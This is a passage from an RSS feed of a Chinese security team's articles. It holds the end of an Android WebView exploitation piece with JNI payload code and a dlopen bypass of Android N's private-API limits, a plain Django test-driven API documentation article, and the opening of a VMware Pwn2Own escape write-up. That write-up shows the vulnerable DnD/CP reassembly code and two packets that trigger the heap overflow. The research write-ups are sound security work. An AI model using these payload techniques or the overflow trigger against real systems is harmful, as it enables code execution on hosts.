jmethodID constructor = (*env)-&amp;gt;GetMethodID(env, clsFileInputStream, &quot;&amp;lt;init&amp;gt;&quot;, &quot;(Ljava/lang/String;)V&quot;);
jobject fileInputStream = (*env)-&amp;gt;NewObject(env, clsFileInputStream, constructor, filename);

constructor = (*env)-&amp;gt;GetMethodID(env, clsObjectInputStream, &quot;&amp;lt;init&amp;gt;&quot;, &quot;(Ljava/io/InputStream;)V&quot;);
jobject objInputStream = (*env)-&amp;gt;NewObject(env, clsObjectInputStream, constructor, fileInputStream);
jmethodID readObject = (*env)-&amp;gt;GetMethodID(env, clsObjectInputStream, &quot;readObject&quot;, &quot;()Ljava/lang/Object;&quot;);
jobject hashmap = (*env)-&amp;gt;CallObjectMethod(env, objInputStream, readObject);

// cast to hash map
jmethodID get = (*env)-&amp;gt;GetMethodID(env, clsHashMap, &quot;get&quot;, &quot;(Ljava/lang/Object;)Ljava/lang/Object;&quot;);
jmethodID toString = (*env)-&amp;gt;GetMethodID(env, (*env)-&amp;gt;FindClass(env, &quot;java/lang/Object&quot;), &quot;toString&quot;, &quot;()Ljava/lang/String;&quot;);

jclass clsInteger = (*env)-&amp;gt;FindClass(env, &quot;java/lang/Integer&quot;);
jmethodID valueOf = (*env)-&amp;gt;GetStaticMethodID(env, clsInteger, &quot;valueOf&quot;, &quot;(I)Ljava/lang/Integer;&quot;);
jobject key = (*env)-&amp;gt;CallStaticObjectMethod(env, clsInteger, valueOf, 258);
jstring val = (*env)-&amp;gt;CallObjectMethod(env, hashmap, get, key);

strncpy(id, (*env)-&amp;gt;GetStringUTFChars(env, val, 0), len);
&lt;/code&gt;&lt;p&gt;正常情况下，JNIEnv 是系统初始化并传给 native 方法的。但在开发利用载荷的时候不是使用标准的方式加载链接库，因此需要使用一些私有 API。如果代码直接运行在 App 进程中，可通过 android::AndroidRuntime::getJNIEnv 直接获取，或者 JNI_GetCreatedJavaVMs 获得当前进程的唯一 JVM 实例后调用其 GetEnv 方法。如果使用独立的可执行文件，可通过 JNI_CreateJavaVM 创建一个新的 JVM。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Android 调用 JVM 的一些问题&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://developer.android.com/about/versions/nougat/android-7.0-changes.html?hl=zh-cn#ndk&quot;&gt;Android N 对 NDK 链接的行为做了变更&lt;/a&gt;，禁止链接到私有 API，包括上文提到的 JVM 相关函数。一个非常简单的绕过方式是向 dlopen 传入空指针作为的文件名，dlsym 将会在所有已加载的共享对象中查找符号。&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;typedef jint (JNICALL *GetCreatedJavaVMs)(JavaVM **, jsize, jsize *);

void *handle = dlopen(NULL, RTLD_NOW);
GetCreatedJavaVMs JNI_GetCreatedJavaVMs =
    (GetCreatedJavaVMs) dlsym(handle, &quot;JNI_GetCreatedJavaVMs&quot;);
&lt;/code&gt;&lt;p&gt;另外一个坑是，在 ART 下，一个可执行文件如果要调用 JNI_CreateJavaVM 创建 JVM，那么它必须导出 InitializeSignalChain、ClaimSignalChain、UnclaimSignalChain、InvokeUserSignalHandler、EnsureFrontOfChain 这几个回调函数，否则会在 logcat 里看到大量类似&lt;br&gt;&quot;InitializeSignalChain is not exported by the main executable.&quot; 的提示，然后 SIGABRT。&lt;/p&gt;&lt;p&gt;AOSP 对应的代码如下，可以看到在输出这行日志之后就会调用 abort()：&lt;br&gt;&lt;a href=&quot;https://android.googlesource.com/platform/art/+/master/sigchainlib/sigchain_dummy.cc&quot;&gt;https://android.googlesource.com/platform/art/+/master/sigchainlib/sigchain_dummy.cc&lt;/a&gt;&lt;/p&gt;&lt;p&gt;解决方案非常简单，只要在源文件里创建这几个对应的函数，代码留空，然后加上 JNIEXPORT 宏设置为导出符号即可：&lt;/p&gt;&lt;code lang=&quot;cpp&quot;&gt;JNIEXPORT void InitializeSignalChain() { }
JNIEXPORT void ClaimSignalChain() { }
JNIEXPORT void UnclaimSignalChain() { }
JNIEXPORT void InvokeUserSignalHandler() { }
JNIEXPORT void EnsureFrontOfChain() { }
&lt;/code&gt;&lt;h2&gt;小结&lt;/h2&gt;&lt;p&gt;WebView 在 Android 应用开发中应用广泛，功能复杂，是颇为理想的攻击面。点开一个链接或者扫描一个二维码就会执行恶意代码并不仅仅是都市传说。开发者在使用 WebView 的时候不仅要注意老生常谈的各种 getSettings()、javascriptInterface 点，还要注意防范通过扩展接口暴露的攻击面和安全问题。&lt;/p&gt;&lt;h2&gt;参考资料&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition&quot; class=&quot;&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/&quot;&gt;https://www.nowsecure.com/blog/2015/06/15/a-pattern-for-remote-code-execution-using-arbitrary-file-writes-and-multidex-applications/&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://d3adend.org/blog/?p=851&quot;&gt;http://d3adend.org/blog/?p=851&lt;/a&gt; &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/functions.html&quot;&gt;https://docs.oracle.com/javase/6/docs/technotes/guides/jni/spec/functions.html&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/secmob/BadKernel&quot;&gt;https://github.com/secmob/BadKernel&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://android.googlesource.com/&quot;&gt;https://android.googlesource.com/&lt;/a&gt;&lt;/li&gt;&lt;/ol&gt;</description>
<author>周知日</author>
<guid isPermaLink="false">2017-07-26-28107901</guid>
<pubDate>Wed, 26 Jul 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>测试驱动文档在后端 API 开发中的实践</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-07-24-28069225.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;测试驱动文档在后端 API 开发中的实践&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28069225&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4b11f4ee60a743d551cd637892361629_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;很多人了解过 &lt;a href=&quot;https://docs.python.org/2/library/doctest.html&quot;&gt;Python 的 doctest&lt;/a&gt;，是从注释中写测试，我们现在反向思维，从测试生成文档。&lt;/p&gt;&lt;h2&gt;现状&lt;/h2&gt;&lt;p&gt;在开头有必要说明一下现在后端 API 的开发模式，这样才能更好的理解遇到的问题。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;框架: Django&lt;/li&gt;&lt;li&gt;给前端提供的都是 JSON API，没有后端渲染的网页&lt;/li&gt;&lt;li&gt;所有的 API 都继承 APIView，但是并不是 Django REST framework（以下简称 DRF，名字太长了） 中的 APIView，这个后面会说原因&lt;/li&gt;&lt;li&gt;使用 DRF 中的部分 serializer 来做数据格式验证和 QuerySet 转换为 Python 字典列表等类型的工作&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;DRF 库提供了很多我们并不会用到的功能，比如&lt;/p&gt;&lt;ul&gt;&lt;li&gt;登录验证，权限管理，API 版本号管理，限流、自动翻页等等，这些我们更侧重独立和手动的处理。&lt;/li&gt;&lt;li&gt;Generic Views 一直是一个让我感到疑惑的东西，看似写起来简单，代码量很少，像是填充一些预定义的变量和方法，简单的增删查改会方便一点，但是在实际复杂的业务场景下，可能导致问题复杂化，并没有显式的写出操作过程更清晰。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;所以我们仿照 DRF 的 APIView，继承 Django 的 View,自己写了一个新的 APIView，包含了核心功能，解析 JSON，同时增加了部分常用方法，比如 validate_serializer、self.success、self.error 和 self.paginate 等等。&lt;/p&gt;&lt;p&gt;下面是一段伪代码&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class UserProfileAPI(APIView):
    @validate_serializer(ChangeUserProfileSeralizer)
    def put(self):
        ....
        if err:
            return self.error(&quot;保存失败&quot;)
        return self.success(UserProfileSerailzier(user_profile).data)

class ProblemAPI(APIView):
    def get(self):
        return self.success(self.paginate(request,Problem.objects.all(), 
                            ProblemSerializer)))
&lt;/code&gt;&lt;h2&gt;现有的文档存在什么问题&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;没有文档，靠&quot;口口相传&quot;和&quot;心有灵犀&quot;。&lt;/li&gt;&lt;li&gt;手写 API 文档，不同人写出来的可能格式风格略有差异，也不容易统一管理。更重要的是人都是懒的，没有监督的情况下，文档能不写就不写，而测试还是要必须要写的。&lt;/li&gt;&lt;li&gt;一处修改很多 API 可能都会变，比如某一个 Model 修改了字段，很多 API 的返回值都可能受到影响，手动的逐个修改并不科学。&lt;/li&gt;&lt;li&gt;已有的文档生成工具自定义程度不高，比如 &lt;a href=&quot;https://github.com/marcgibbons/django-rest-swagger&quot;&gt;Django REST Swagger&lt;/a&gt; 要求 Generic Views 就放弃了。&lt;/li&gt;&lt;li&gt;还有些文档生成工具是在注释中使用特定的格式描述 API 字段和细节的，其实和手写文档没有本质上的差异。&lt;/li&gt;&lt;li&gt;上面几条总结一下就是：手写的文档很难自动化验证是否正确，测试生成文档可以保证和测试是一致的。&lt;/li&gt;&lt;li&gt;虽然&quot;代码即文档&quot;，但是也只适用于非 API 文档，比如数据库设计、架构设计、算法设计等，因为代码并不一定适合传播给所有人看，尤其是 API 文档一般都是对外的，而且代码中的注释经常是分散的，文档上一个 API 的说明、请求、响应等几部分数据可能分散在几个文件中。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;我们的实践&lt;/h2&gt;&lt;p&gt;要改进上面的问题，基本原则是尽量少改动已有的代码，所以经过和 @reverland 的一番讨论，确定使用下面的方法：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;使用 serializer 生成数据格式描述性文档&lt;/li&gt;&lt;li&gt;使用部分测试充当 API 样例数据&lt;/li&gt;&lt;li&gt;CI 的时候，识别 commit 信息中的doc deploy 后生成和自动部署文本版文档和 Postman 导出格式&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;serializer 的文档&lt;/h2&gt;&lt;p&gt;由一个 serializer 生成对应的描述性文档相对是比较简单的，一个典型的 serializer 是这样的&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class IPOrSubnetField(serializers.CharField):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        if not kwargs.get(&quot;help_text&quot;):
            self.help_text = &quot;IPv4 的 IP 或者子网形式字符串&quot;

    def to_internal_value(self, data):
        pass

class CreateRuleSerializer(serializers.Serializer):
    &quot;&quot;&quot;
    一条规则可以封禁也可以限制频率，封禁的时候，不需要传递 e 和 f 字段。
    &quot;&quot;&quot;
    a = serializers.IntegerField(allow_null=True, required=False)
    b = serializers.CharField(allow_null=True, required=False)
    d = serializers.CharField(allow_null=True, required=False)
    d = serializers.ChoiceField(choices=[RuleAction.forbid, RuleAction.limit_rate])
    e = serializers.IntegerField(required=False, allow_null=True, min_value=1)
    f = serializers.IntegerField(required=False, allow_null=True, min_value=1)
    g = serializers.CharField(max_length=128, allow_blank=True, required=False)
    h = serializers.ListField(child=IPOrSubnetField())&lt;/code&gt;&lt;p&gt;下面是我们生成的表格文档&lt;/p&gt;&lt;p&gt;数据格式&lt;/p&gt;&lt;blockquote&gt;一条规则可以封禁也可以限制频率，封禁的时候，不需要传递 e 和 f 字段。&lt;/blockquote&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1a7a0507ee3eda5dd52945ec3351cf22_r.png&quot; data-rawwidth=&quot;678&quot; data-rawheight=&quot;475&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个表格包含了字段名、数据类型、数据格式、字段额外说明等几部分信息。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;一个 serializer 的所有字段可以在 serializer.fields.items() 中得到，只要遍历一下所有的字段就不难再针对性的处理。&lt;/li&gt;&lt;li&gt;字段的类型很容易推断，is_instance(field, serializers.IntegerField) 等逐个的比较就可以知道。&lt;/li&gt;&lt;li&gt;几乎所有的字段都支持 required 和 null 参数，代表是否允许不传递该字段和是否允许该字段的值为 null。对于字符串类型和数据类型的字段等，还支持 max_length / max_value 和 min_length / min_value 参数，代表数据的范围，其他的个别格式限制可以参考下 DRF 的源码。&lt;/li&gt;&lt;li&gt;有的字段需要额外说明才方便理解，或者有些字段是互斥的，不可以同时传递，所以我们还是要支持在代码中自我描述的功能，这些说明有两处来源，一个是 serializer 的 doc string，另一个是 field 的 help_text 属性。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在单元测试的时候，Client 会传递一个特殊的 HTTP 头，这样 @validate_serializer 就知道是否要生成 serializer 的文档了。&lt;/p&gt;&lt;h2&gt;API数据的文档&lt;/h2&gt;&lt;p&gt;一个 API 仅仅有数据格式的要求是不够的，最好还能够提供一些常见的正确和错误使用的例子，这样也可以帮助用户去更好的理解 API 的用途，单元测试的测试用例就是这些示例最好的来源。&lt;/p&gt;&lt;p&gt;一个典型的单元测试是这样子的&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class ACLAPITest(APITestCase):
    @document
    def test_create_acl_rule(self):
        &quot;&quot;&quot;
        创建 acl 规则，只有 cidr
        &quot;&quot;&quot;
        resp = self.client.post(self.url, data=self.base_rule)
        self.assertSuccess(resp)
        ...        
        return resp

    @document
    def test_edit_acl_rule(self):
        &quot;&quot;&quot;
        编辑 acl 规则
        &quot;&quot;&quot;
        rule_id = self.test_create_acl_rule_ip().data[&quot;data&quot;][&quot;id&quot;]
        ...
        resp = self.client.put(self.url, data=new_rule)
        self.assertSuccess(resp)
        ...
&lt;/code&gt;&lt;p&gt;这里测试创建和编辑 ACL 规则。@document 是标记这个测试用例要生成文档。我们通过修改 Client 的属性来实现。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;def document(method):
    @functools.wraps(method)
    def handle(*args, **kwargs):
        if args[0]._testMethodName == method.__name__:
            args[0].client.test_method_name = args[0]._testMethodName
            args[0].client.doc = method.__doc__
            args[0].client.running_module = method.__module__.split(&quot;.&quot;)[0]
        ret = method(*args, **kwargs)
        return ret
    return handle
&lt;/code&gt;&lt;p&gt;要注意的是，只有修饰在当前正在执行的测试上，才会去更新这些属性，否则运行 test_edit_acl_rule 的时候，test_create_acl_rule 会把 Client 的属性改错。&lt;/p&gt;&lt;p&gt;测试中的 Client 就是一个生成 HTTP 请求，然后模拟发送请求的组件，要想记录下请求和响应的内容，替换掉 DRF 原生 Client 是必须的，当然这个也不难，只要继承原来的 Client，重载相关方法，记录请求数据，然后调用父类的方法，再记录响应数据就可以了。&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class DocumentAPIClient(APIClient):
    test_method_name = &quot;&quot;
    doc = &quot;&quot;
    running_module = &quot;&quot;

    def _request(self, method, *args, **kwargs):
        make_doc = self.test_method_name == inspect.stack()[2].function
        if make_doc:
            kwargs[&quot;serializer_gen_doc&quot;] = True
        # kwargs 中的额外参数，在 view 中 request.META 中可以取到，类似额外的 HTTP 头
        resp = getattr(super(), method)(*args, **kwargs)

        if make_doc:
            # 记录 API 请求和响应
            pass

class APITestCase(TestCase):
    client_class = DocumentAPIClient
&lt;/code&gt;&lt;p&gt;有几点是要注意的&lt;/p&gt;&lt;ul&gt;&lt;li&gt;测试用例存在嵌套关系的时候，比如 test_edit_acl_rule 中，我们只关心本测试中发送的请求，而不关心调用的 test_create_acl_rule 中发送的请求，所以 Client 需要根据代码调用栈来判断自己的位置。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;请求是在当前正在执行的 test_create_acl_rule 中发出的，那么函数栈是&lt;/p&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;self._request(0)&lt;/li&gt;&lt;li&gt;self.post…(1)&lt;/li&gt;&lt;li&gt;test_create_acl_rule(2)&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p&gt;test_edit_acl_rule 中调用了 test_create_acl_rule 时，self.test_method_name == &quot;test_edit&quot;，而函数栈是&lt;/p&gt;&lt;ul&gt;&lt;ul&gt;&lt;li&gt;self._request(0)&lt;/li&gt;&lt;li&gt;self.post…(1)&lt;/li&gt;&lt;li&gt;test_create_acl_rule(2)&lt;/li&gt;&lt;li&gt;test_edit_acl_rule(3)&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;不是所有的 API 都是可 JSON 的，比如上传或者下载文件的请求，生成文档的时候需要特例处理下。可以写一个自定义的 JSON Encoder 来实现。&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;python&quot;&gt;class MultipartToJsonLikeEncoder(json.JSONEncoder):
     def default(self, o):
         if isinstance(o, io.BytesIO) or isinstance(o, io.StringIO):
             return &quot;&amp;lt;文件上传 💾 &amp;gt;&quot;
         return json.JSONEncoder.default(self, o)&lt;/code&gt;&lt;ul&gt;&lt;li&gt;生成文档的时候要排序，将响应正确的排在前面，响应错误的排在后面。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;总结&lt;/h2&gt;&lt;p&gt;解决了已有的问题，而且鼓励开发者认真的去写更规范的测试&lt;/p&gt;&lt;ul&gt;&lt;li&gt;为了生成文档，至少会写一个简化版测试，总比没有测试要好&lt;/li&gt;&lt;li&gt;一个测试只干一件事情，否则生成的文档会有重复&lt;/li&gt;&lt;li&gt;测试中会写注释标明测试的用途&lt;/li&gt;&lt;/ul&gt;</description>
<author>CeleryL</author>
<guid isPermaLink="false">2017-07-24-28069225</guid>
<pubDate>Mon, 24 Jul 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>利用一个堆溢出漏洞实现VMware虚拟机逃逸</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-07-06-27733895.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;利用一个堆溢出漏洞实现VMware虚拟机逃逸&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27733895&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d158e3218b51842880080a282a3bf0cd_r.png&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;[作者：李小龙（acez），中文翻译：kelwin]&lt;br&gt;&lt;/p&gt;&lt;h2&gt;1. 介绍&lt;/h2&gt;&lt;p&gt;2017年3月，长亭安全研究实验室（&lt;a href=&quot;https://chaitin.cn/&quot; data-editable=&quot;true&quot; data-title=&quot;Chaitin&quot; class=&quot;&quot;&gt;Chaitin&lt;/a&gt; Security Research Lab）参加了Pwn2Own黑客大赛，我作为团队的一员，一直专注于VMware Workstation Pro的破解，并成功在赛前完成了一个虚拟机逃逸的漏洞利用。（很不）幸运的是，就在Pwn2Own比赛的前一天（3月14日），VMware发布了一个新的版本，其中修复了我们所利用的漏洞。在本文中，我会介绍我们从发现漏洞到完成利用的整个过程。感谢&lt;a href=&quot;http://weibo.com/kelwinyang&quot; data-editable=&quot;true&quot; data-title=&quot;@kelwin&quot; class=&quot;&quot;&gt;@kelwin&lt;/a&gt;在实现漏洞利用过程中给予的帮助，也感谢ZDI的朋友，他们近期也发布了一篇相关&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware&quot; data-editable=&quot;true&quot; data-title=&quot;博客&quot; class=&quot;&quot;&gt;博客&lt;/a&gt;，正是这篇博文促使我们完成本篇writeup。&lt;/p&gt;&lt;p&gt;本文主要由三部分组成：首先我们会简要介绍VMware中的RPCI机制，其次我们会描述本文使用的漏洞，最后讲解我们是如何利用这一个漏洞来绕过ASLR并实现代码执行的。&lt;/p&gt;&lt;h2&gt;2. VMware RPCI机制&lt;/h2&gt;&lt;p&gt;VMware实现了多种虚拟机（下文称为guest）与宿主机（下文称文host）之间的通信方式。其中一种方式是通过一个叫做Backdoor的接口，这种方式的设计很有趣，guest只需在用户态就可以通过该接口发送命令。VMware Tools也部分使用了这种接口来和host通信。我们来看部分相关代码（摘自&lt;a href=&quot;https://github.com/vmware/open-vm-tools&quot; data-editable=&quot;true&quot; data-title=&quot;open-vm-tools&quot; class=&quot;&quot;&gt;open-vm-tools&lt;/a&gt;中的lib/backdoor/backdoorGcc64.c）：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;void  
Backdoor_InOut(Backdoor_proto *myBp) // IN/OUT  
{
   uint64 dummy;

   __asm__ __volatile__(
#ifdef __APPLE__
        /*
         * Save %rbx on the stack because the Mac OS GCC doesn&#39;t want us to
         * clobber it - it erroneously thinks %rbx is the PIC register.
         * (Radar bug 7304232)
         */
        &quot;pushq %%rbx&quot;           &quot;\n\t&quot;
#endif
        &quot;pushq %%rax&quot;           &quot;\n\t&quot;
        &quot;movq 40(%%rax), %%rdi&quot; &quot;\n\t&quot;
        &quot;movq 32(%%rax), %%rsi&quot; &quot;\n\t&quot;
        &quot;movq 24(%%rax), %%rdx&quot; &quot;\n\t&quot;
        &quot;movq 16(%%rax), %%rcx&quot; &quot;\n\t&quot;
        &quot;movq  8(%%rax), %%rbx&quot; &quot;\n\t&quot;
        &quot;movq   (%%rax), %%rax&quot; &quot;\n\t&quot;
        &quot;inl %%dx, %%eax&quot;       &quot;\n\t&quot;  /* NB: There is no inq instruction */
        &quot;xchgq %%rax, (%%rsp)&quot;  &quot;\n\t&quot;
        &quot;movq %%rdi, 40(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rsi, 32(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rdx, 24(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rcx, 16(%%rax)&quot; &quot;\n\t&quot;
        &quot;movq %%rbx,  8(%%rax)&quot; &quot;\n\t&quot;
        &quot;popq          (%%rax)&quot; &quot;\n\t&quot;
#ifdef __APPLE__
        &quot;popq %%rbx&quot;            &quot;\n\t&quot;
#endif
      : &quot;=a&quot; (dummy)
      : &quot;0&quot; (myBp)
      /*
       * vmware can modify the whole VM state without the compiler knowing
       * it. So far it does not modify EFLAGS. --hpreg
       */
      :
#ifndef __APPLE__
      /* %rbx is unchanged at the end of the function on Mac OS. */
      &quot;rbx&quot;,
#endif
      &quot;rcx&quot;, &quot;rdx&quot;, &quot;rsi&quot;, &quot;rdi&quot;, &quot;memory&quot;
   );
}
&lt;/code&gt;&lt;p&gt;上面的代码中出现了一个很奇怪的指令inl。在通常环境下（例如Linux下默认的I/O权限设置），用户态程序是无法执行I/O指令的，因为这条指令只会让用户态程序出错并产生崩溃。而此处这条指令产生的权限错误会被host上的hypervisor捕捉，从而实现通信。Backdoor所引入的这种从guest上的用户态程序直接和host通信的能力，带来了一个有趣的攻击面，这个攻击面正好满足Pwn2Own的要求：“在这个类型（指虚拟机逃逸这一类挑战）中，攻击必须从guest的非管理员帐号发起，并实现在host操作系统中执行任意代码”。guest将0x564D5868存入$eax，I/O端口号0x5658或0x5659存储在$dx中，分别对应低带宽和高带宽通信。其它寄存器被用于传递参数，例如$ecx的低16位被用来存储命令号。对于RPCI通信，命令号会被设为BDOOR_CMD_MESSAGE（=30）。文件lib/include/backdoor_def.h中包含了一些支持的backdoor命令列表。host捕捉到错误后，会读取命令号并分发至相应的处理函数。此处我省略了很多细节，如果你有兴趣可以阅读相关源码。&lt;br&gt;&lt;/p&gt;&lt;h2&gt;2.1 RPCI&lt;/h2&gt;&lt;p&gt;远程过程调用接口RPCI（Remote Procedure Call Interface）是基于前面提到的Backdoor机制实现的。依赖这个机制，guest能够向host发送请求来完成某些操作，例如，拖放（Drag n Drop）/复制粘贴（Copy Paste）操作、发送或获取信息等等。RPCI请求的格式非常简单：&amp;lt;命令&amp;gt; &amp;lt;参数&amp;gt;。例如RPCI请求info-get guestinfo.ip可以用来获取guest的IP地址。对于每个RPCI命令，在vmware-vmx进程中都有相关注册和处理操作。&lt;/p&gt;&lt;p&gt;需要注意的是有些RPCI命令是基于VMCI套接字实现的，但此内容已超出本文讨论的范畴。&lt;/p&gt;&lt;h2&gt;3. 漏洞&lt;/h2&gt;&lt;p&gt;花了一些时间逆向各种不同的RPCI处理函数之后，我决定专注于分析拖放（Drag n Drop，下面简称为DnD）和复制粘贴（Copy Paste，下面简称为CP）功能。这部分可能是最复杂的RPCI命令，也是最可能找到漏洞的地方。在深入理解的DnD/CP内部工作机理后，可以很容易发现，在没有用户交互的情况下，这些处理函数中的许多功能是无法调用的。DnD/CP的核心功能维护了一个状态机，在无用户交互（例如拖动鼠标从host到guest中）情况下，许多状态是无法达到的。&lt;/p&gt;&lt;p&gt;我决定看一看Pwnfest 2016上被利用的漏洞，该漏洞在&lt;a href=&quot;https://www.vmware.com/security/advisories/VMSA-2016-0019.html&quot; data-editable=&quot;true&quot; data-title=&quot;这个&quot;&gt;这个&lt;/a&gt;VMware安全公告中有所提及。此时我的idb已经标上了很多符号，所以很容易就通过bindiff找到了补丁的位置。下面的代码是修补之前存在漏洞的函数（可以看出services/plugins/dndcp/dnddndCPMsgV4.c中有对应源码，漏洞依然存在于&lt;a href=&quot;https://github.com/vmware/open-vm-tools&quot; data-editable=&quot;true&quot; data-title=&quot;open-vm-tools&quot;&gt;open-vm-tools&lt;/a&gt;的git仓库的master分支当中）：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;static Bool  
DnDCPMsgV4IsPacketValid(const uint8 *packet,  
                        size_t packetSize)
{
   DnDCPMsgHdrV4 *msgHdr = NULL;
   ASSERT(packet);

   if (packetSize &amp;lt; DND_CP_MSG_HEADERSIZE_V4) {
      return FALSE;
   }

   msgHdr = (DnDCPMsgHdrV4 *)packet;

   /* Payload size is not valid. */
   if (msgHdr-&amp;gt;payloadSize &amp;gt; DND_CP_PACKET_MAX_PAYLOAD_SIZE_V4) {
      return FALSE;
   }

   /* Binary size is not valid. */
   if (msgHdr-&amp;gt;binarySize &amp;gt; DND_CP_MSG_MAX_BINARY_SIZE_V4) {
      return FALSE;
   }

   /* Payload size is more than binary size. */
   if (msgHdr-&amp;gt;payloadOffset + msgHdr-&amp;gt;payloadSize &amp;gt; msgHdr-&amp;gt;binarySize) { // [1]
      return FALSE;
   }

   return TRUE;
}

Bool  
DnDCPMsgV4_UnserializeMultiple(DnDCPMsgV4 *msg,  
                               const uint8 *packet,
                               size_t packetSize)
{
   DnDCPMsgHdrV4 *msgHdr = NULL;
   ASSERT(msg);
   ASSERT(packet);

   if (!DnDCPMsgV4IsPacketValid(packet, packetSize)) {
      return FALSE;
   }

   msgHdr = (DnDCPMsgHdrV4 *)packet;

   /*
    * For each session, there is at most 1 big message. If the received
    * sessionId is different with buffered one, the received packet is for
    * another another new message. Destroy old buffered message.
    */
   if (msg-&amp;gt;binary &amp;amp;&amp;amp;
       msg-&amp;gt;hdr.sessionId != msgHdr-&amp;gt;sessionId) {
      DnDCPMsgV4_Destroy(msg);
   }

   /* Offset should be 0 for new message. */
   if (NULL == msg-&amp;gt;binary &amp;amp;&amp;amp; msgHdr-&amp;gt;payloadOffset != 0) {
      return FALSE;
   }

   /* For existing buffered message, the payload offset should match. */
   if (msg-&amp;gt;binary &amp;amp;&amp;amp;
       msg-&amp;gt;hdr.sessionId == msgHdr-&amp;gt;sessionId &amp;amp;&amp;amp;
       msg-&amp;gt;hdr.payloadOffset != msgHdr-&amp;gt;payloadOffset) {
      return FALSE;
   }

   if (NULL == msg-&amp;gt;binary) {
      memcpy(msg, msgHdr, DND_CP_MSG_HEADERSIZE_V4);
      msg-&amp;gt;binary = Util_SafeMalloc(msg-&amp;gt;hdr.binarySize);
   }

   /* msg-&amp;gt;hdr.payloadOffset is used as received binary size. */
   memcpy(msg-&amp;gt;binary + msg-&amp;gt;hdr.payloadOffset,
          packet + DND_CP_MSG_HEADERSIZE_V4,
          msgHdr-&amp;gt;payloadSize); // [2]
   msg-&amp;gt;hdr.payloadOffset += msgHdr-&amp;gt;payloadSize;
   return TRUE;
}
&lt;/code&gt;&lt;p&gt;对于Version 4的DnD/CP功能，当guest发送分片DnD/CP命令数据包时，host会调用上面的函数来重组guest发送的DnD/CP消息。接收的第一个包必须满足payloadOffset为0，binarySize代表堆上分配的buffer长度。[1]处的检查比较了包头中的binarySize，用来确保payloadOffset和payloadSize不会越界。在[2]处，数据会被拷入分配的buffer中。但是[1]处的检查存在问题，它只对接收的第一个包有效，对于后续的数据包，这个检查是无效的，因为代码预期包头中的binarySize和分片流中的第一个包相同，但实际上你可以在后续的包中指定更大的binarySize来满足检查，并触发堆溢出。&lt;/p&gt;&lt;p&gt;所以，该漏洞可以通过发送下面的两个分片来触发：&lt;/p&gt;&lt;code lang=&quot;c&quot;&gt;packet 1{  
 ...
 binarySize = 0x100
 payloadOffset = 0
 payloadSize = 0x50
 sessionId = 0x41414141
 ...
 #...0x50 bytes...#
}

packet 2{  
 ...
 binarySize = 0x1000
 payloadOffset = 0x50
 payloadSize = 0x100
 sessionId = 0x41414141
 ...
 #...0x100 bytes...#
}
